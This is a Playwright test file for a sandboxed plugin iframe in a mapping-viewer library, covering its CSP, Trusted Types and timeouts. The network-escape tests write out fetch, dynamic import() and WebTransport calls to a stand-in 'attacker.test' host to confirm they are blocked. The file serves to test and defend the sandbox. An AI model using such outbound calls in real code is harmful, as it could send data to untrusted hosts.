import { createHash } from 'node:crypto';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative } from 'node:path';
import { build } from 'esbuild';
import { expect, test, type BrowserContext, type Page } from '@playwright/test';

// Stage #2059 (VF2): the `mapping-viewer/formats` entry runs a specialization's format plugin in a sandbox
// iframe of the host page, with a Trusted Types policy and a CSP of its own. The host page here is served on
// an origin of its own (`page.route`) with the CSP in a header and the bundle inline by hash, so each test
// chooses what the host allows. The bundle is built here with esbuild from `viewer/formats.ts` and
// `viewer/index.ts` (the CI `e2e` job does not run `build:viewer`).

const ROOT = process.cwd();
const LIBRARY = join(ROOT, 'examples', 'libraries', 'sdui-backend');
const PLUGINS = join(ROOT, 'tests', 'fixtures', 'plugins');
const HOST = 'https://host.test';
const FORMAT = 'sdui-backend/sdui';
/** What `sandbox-unavailable` has to tell the host (decision 2): the three requirements. */
const REQUIREMENTS = [/script-src/, /worker-src/, /trusted-types/];

interface LibraryFile {
  readonly path: string;
  readonly text: string;
}

function filesOf(dir: string): LibraryFile[] {
  return readdirSync(dir).flatMap((name) => {
    const path = join(dir, name);
    if (statSync(path).isDirectory()) return filesOf(path);
    if (!/\.(json|js)$/.test(name)) return [];
    return [{ path: relative(LIBRARY, path), text: readFileSync(path, 'utf8') }];
  });
}

/** The package with `escape-network` and `loop` added as formats of the specialization. */
function packageFiles(): LibraryFile[] {
  const files = filesOf(LIBRARY);
  const spec = files.find((f) => f.path === 'sdui-backend.spec.json')!;
  const json = JSON.parse(spec.text) as { fileFormats: Record<string, unknown>[] };
  for (const id of ['escape-network', 'loop']) {
    json.fileFormats.push({
      id,
      name: id,
      extension: 'txt',
      plugin: `plugins/${id}.js`,
      scope: 'container',
      contract: 1,
    });
    files.push({
      path: `plugins/${id}.js`,
      text: readFileSync(join(PLUGINS, `${id}.js`), 'utf8'),
    });
  }
  return files.map((f) =>
    f === spec ? { path: f.path, text: JSON.stringify(json, null, 2) } : f,
  );
}

const ENTRY = `
import { FORMAT_SANDBOX_CSP, disposeFormatSandbox, screenFromFormat } from './viewer/formats';
import { createViewer, konvaMeasurer, loadLibrary } from './viewer/index';

// The host's own policy, as PACKAGE-README.md tells it: Konva clears the stage with innerHTML = ''.
if (window.trustedTypes) {
  window.trustedTypes.createPolicy('default', { createHTML: (input) => (input === '' ? input : null) });
}

const library = loadLibrary(JSON.parse(document.getElementById('library').textContent));
const stage = document.getElementById('stage');
let viewer = null;

async function read(format, text) {
  const result = await screenFromFormat(library, text, { format, measure: konvaMeasurer });
  return {
    error: result.error ?? null,
    warnings: result.warnings,
    screens: result.screens.map((s) => ({ id: s.id, name: s.name, width: s.width, height: s.height, instances: s.instances.length })),
    screen: result.screen ?? null,
  };
}

async function draw(screen) {
  viewer?.dispose();
  stage.removeAttribute('data-drawn');
  viewer = createViewer(stage, { library, screen, measure: konvaMeasurer });
  await new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve)));
  const first = viewer.screen().instances[0];
  const box = viewer.boxOf(first.id);
  const hit = viewer.instanceAt({ x: box.x + box.width / 2, y: box.y + box.height / 2 });
  stage.dataset.drawn = String(viewer.screen().instances.length);
  stage.dataset.hit = hit ?? '';
}

window.mv = { read, draw, dispose: disposeFormatSandbox, csp: FORMAT_SANDBOX_CSP };
document.body.dataset.ready = 'true';
`;

let bundle = '';
let bundleHash = '';
let sandboxHash = '';

test.beforeAll(async () => {
  const out = await build({
    stdin: {
      contents: ENTRY,
      resolveDir: ROOT,
      loader: 'ts',
      sourcefile: 'host-entry.ts',
    },
    bundle: true,
    write: false,
    format: 'esm',
    platform: 'browser',
    target: 'es2022',
    minify: true,
    legalComments: 'none',
    logLevel: 'silent',
  });
  bundle = out.outputFiles[0]!.text;
  bundleHash = `'sha256-${createHash('sha256').update(bundle, 'utf8').digest('base64')}'`;
  const { SANDBOX_BOOTSTRAP_HASH } = await import('../../src/app/formatSandbox');
  sandboxHash = SANDBOX_BOOTSTRAP_HASH;
});

interface HostCsp {
  /** Sources of `script-src` besides the bundle's hash. */
  readonly scripts?: readonly string[];
  readonly worker?: string;
  /** `null`: no Trusted Types at all. */
  readonly trustedTypes?: string | null;
  readonly connect?: string;
}

/** The CSP of a host that follows `viewer/PACKAGE-README.md`, with one change per refusal test. */
function hostCsp(host: HostCsp = {}): string {
  const scripts = host.scripts ?? [sandboxHash];
  const trusted =
    host.trustedTypes === null
      ? []
      : [
          "require-trusted-types-for 'script'",
          `trusted-types ${host.trustedTypes ?? 'mapping-viewer default'}`,
        ];
  return [
    "default-src 'none'",
    `script-src ${[bundleHash, ...scripts].join(' ')}`,
    `worker-src ${host.worker ?? 'blob:'}`,
    `connect-src ${host.connect ?? "'none'"}`,
    'img-src data: blob:',
    ...trusted,
  ].join('; ');
}

function hostHtml(): string {
  const library = JSON.stringify(packageFiles()).replace(/</g, '\\u003c');
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Host</title></head><body><div id="stage"></div><script type="application/json" id="library">${library}</script><script type="module">${bundle}</script></body></html>`;
}

/** Serves the host page on its own origin, with `csp` in the header, and waits for the bundle to run. */
async function openHost(page: Page, csp: string): Promise<void> {
  await page.route(`${HOST}/**`, (route) =>
    route.fulfill({
      status: 200,
      contentType: 'text/html',
      headers: { 'content-security-policy': csp },
      body: hostHtml(),
    }),
  );
  await page.goto(`${HOST}/`);
  await expect(page.locator('body')).toHaveAttribute('data-ready', 'true');
  await page.evaluate(() => {
    const stage = document.getElementById('stage')!;
    stage.style.width = '480px';
    stage.style.height = '640px';
  });
}

interface ReadResult {
  readonly error: { code: string; message: string } | null;
  readonly screens: { name: string; instances: number }[];
  readonly screen: unknown;
}

const read = (page: Page, format: string, text: string): Promise<ReadResult> =>
  page.evaluate(
    ([f, t]) =>
      (
        window as unknown as { mv: { read(f: string, t: string): Promise<ReadResult> } }
      ).mv.read(f, t!),
    [format, text] as const,
  );

const HOME = readFileSync(join(LIBRARY, 'examples', 'home.sdui.json'), 'utf8');

/** A screen the host builds itself (as it does today), to draw with a viewer next to a refused sandbox. */
const HAND_MADE = {
  id: 's1',
  name: 'By hand',
  width: 300,
  height: 200,
  background: '#FFFFFF',
  instances: [
    {
      id: 'b1',
      typeId: 'sdui-button',
      box: { x: 20, y: 20, width: 120, height: 40 },
      values: { label: 'Hand made' },
    },
  ],
};

async function draw(page: Page, screen: unknown): Promise<void> {
  await page.evaluate(
    (s) => (window as unknown as { mv: { draw(s: unknown): Promise<void> } }).mv.draw(s),
    screen,
  );
}

test.describe('screenFromFormat in a host page', () => {
  test('a host with the full CSP and Trusted Types gets the screen of home.sdui.json, and the viewer draws it', async ({
    page,
  }) => {
    await openHost(page, hostCsp());
    const result = await read(page, FORMAT, HOME);
    expect(result.error).toBeNull();
    expect(result.screens).toHaveLength(1);
    expect(result.screens[0]).toMatchObject({ name: 'Home' });
    expect(result.screens[0]!.instances).toBeGreaterThan(0);
    await draw(page, result.screen);
    const stage = page.locator('#stage');
    await expect(stage).toHaveAttribute(
      'data-drawn',
      String(result.screens[0]!.instances),
    );
    await expect(stage).toHaveAttribute('data-hit', /.+/);
    // The second call uses the same iframe.
    expect(await page.locator('iframe').count()).toBe(1);
    expect((await read(page, FORMAT, HOME)).error).toBeNull();
    expect(await page.locator('iframe').count()).toBe(1);
  });

  test('a host with no Trusted Types at all works too', async ({ page }) => {
    await openHost(page, hostCsp({ trustedTypes: null }));
    expect((await read(page, FORMAT, HOME)).error).toBeNull();
  });

  test('disposeFormatSandbox removes the iframe, and the next call makes another', async ({
    page,
  }) => {
    await openHost(page, hostCsp());
    expect((await read(page, FORMAT, HOME)).error).toBeNull();
    await page.evaluate(() =>
      (window as unknown as { mv: { dispose(): void } }).mv.dispose(),
    );
    await expect(page.locator('iframe')).toHaveCount(0);
    expect((await read(page, FORMAT, HOME)).error).toBeNull();
    await expect(page.locator('iframe')).toHaveCount(1);
  });

  test('a format that is not in the library is format-not-found', async ({ page }) => {
    await openHost(page, hostCsp());
    const result = await read(page, 'sdui-backend/nope', HOME);
    expect(result.error?.code).toBe('format-not-found');
    expect(result.error?.message).toContain('sdui-backend/sdui');
  });

  test('loop.js is plugin-timeout, and the next call works', async ({ page }) => {
    test.setTimeout(60_000);
    await openHost(page, hostCsp());
    const looped = await read(page, 'sdui-backend/loop', '{}');
    expect(looped.error?.code).toBe('plugin-timeout');
    const next = await read(page, FORMAT, HOME);
    expect(next.error).toBeNull();
    expect(next.screens).toHaveLength(1);
  });
});

const REFUSALS: readonly { name: string; host: HostCsp }[] = [
  { name: 'without blob: in worker-src', host: { worker: "'none'" } },
  { name: 'without the hash in script-src', host: { scripts: [] } },
  { name: 'without mapping-viewer in trusted-types', host: { trustedTypes: 'default' } },
];

test.describe('a host that refuses the sandbox', () => {
  for (const refusal of REFUSALS) {
    test(`${refusal.name}: sandbox-unavailable, and a screen made by the host still draws`, async ({
      page,
    }) => {
      test.setTimeout(60_000);
      await openHost(page, hostCsp(refusal.host));
      const started = Date.now();
      const result = await read(page, FORMAT, HOME);
      // The limit of the plugin (5 s) plus a margin: a frame that never says it is ready is the slow case.
      expect(Date.now() - started).toBeLessThan(5000 + 3000);
      expect(result.error?.code).toBe('sandbox-unavailable');
      for (const requirement of REQUIREMENTS) {
        expect(result.error?.message).toMatch(requirement);
      }
      expect(result.screens).toEqual([]);
      await draw(page, HAND_MADE);
      await expect(page.locator('#stage')).toHaveAttribute('data-drawn', '1');
      await expect(page.locator('#stage')).toHaveAttribute('data-hit', 'b1');
    });
  }
});

/**
 * What the plugin's attempts come to. `reached`: the requests that got past the browser's own checks to the
 * network layer (the route answers them, so nothing really leaves); `blocked`: the ones the browser refused
 * itself (`ERR_BLOCKED_BY_CSP`).
 */
async function watchAttacker(
  context: BrowserContext,
): Promise<{ reached: string[]; blocked: string[] }> {
  const seen = { reached: [] as string[], blocked: [] as string[] };
  await context.route('https://attacker.test/**', (route) => {
    seen.reached.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'text/javascript', body: '' });
  });
  context.on('requestfailed', (request) => {
    if (new URL(request.url()).hostname === 'attacker.test') {
      seen.blocked.push(`${request.url()} ${request.failure()?.errorText ?? ''}`);
    }
  });
  return seen;
}

test.describe('a host that allows the network', () => {
  const open = (): HostCsp => ({
    connect: '*',
    scripts: [sandboxHash, 'https:', 'blob:'],
  });

  test('the control: a Worker of the host page itself reaches the network (so the watch sees it)', async ({
    page,
    context,
  }) => {
    const seen = await watchAttacker(context);
    await openHost(page, hostCsp({ ...open(), trustedTypes: null }));
    await page.evaluate(() => {
      const script =
        'fetch("https://attacker.test/control-fetch");import("https://attacker.test/control-module.js").catch(()=>{});';
      new Worker(URL.createObjectURL(new Blob([script], { type: 'text/javascript' })));
    });
    await expect.poll(() => seen.reached.length).toBeGreaterThanOrEqual(2);
  });

  test('escape-network.js gets no network: nothing leaves, and the meta shuts WebTransport, import() and fetch', async ({
    page,
    context,
  }) => {
    test.setTimeout(60_000);
    const seen = await watchAttacker(context);
    const messages: string[] = [];
    page.on('console', (message) => messages.push(message.text()));
    await openHost(page, hostCsp(open()));
    const result = await read(page, 'sdui-backend/escape-network', '{}');
    expect(result.error).toBeNull();
    const report = JSON.parse(result.screens[0]!.name) as Record<string, unknown>;
    // The plugin ran (it answered) and its attempts did not throw in a way that ends it.
    expect(report['fetch']).toBe('threw');
    // Let the pending `import()` settle: the browser refused it itself (`ERR_BLOCKED_BY_CSP`) and nothing
    // reached the network layer, although the host's `script-src` allows `https:`.
    await expect
      .poll(() =>
        seen.blocked.some((entry) => entry.startsWith('https://attacker.test/module.js')),
      )
      .toBe(true);
    expect(seen.reached).toEqual([]);

    // The sandbox document's own policy, read where the plugin's Worker inherits it from: each way out is
    // a violation of the `<meta>` (the host's `connect-src *` and `script-src https:` would let it through).
    const sandbox = page.frames().find((frame) => frame !== page.mainFrame());
    expect(sandbox).toBeDefined();
    const violations = await sandbox!.evaluate(
      () =>
        new Promise<string[]>((resolve) => {
          const kinds: string[] = [];
          document.addEventListener('securitypolicyviolation', (event) => {
            kinds.push(`${event.effectiveDirective} ${event.blockedURI}`);
          });
          const quiet = (promise: Promise<unknown>): void => void promise.catch(() => {});
          quiet(fetch('https://attacker.test/fetch'));
          const WebTransportCtor = Reflect.get(window, 'WebTransport') as
            | (new (url: string) => { ready: Promise<unknown>; closed: Promise<unknown> })
            | undefined;
          if (WebTransportCtor) {
            const transport = new WebTransportCtor('https://attacker.test/transport');
            quiet(transport.ready);
            quiet(transport.closed);
          }
          const module = 'https://attacker.test/module-again.js';
          quiet(import(module));
          setTimeout(() => resolve(kinds), 800);
        }),
    );
    expect(
      violations.some((v) => v.startsWith('connect-src') && v.includes('/fetch')),
    ).toBe(true);
    expect(
      violations.some((v) => v.startsWith('connect-src') && v.includes('/transport')),
    ).toBe(true);
    expect(
      violations.some((v) => v.startsWith('script-src') && v.includes('module-again')),
    ).toBe(true);
    expect(seen.reached).toEqual([]);
  });
});
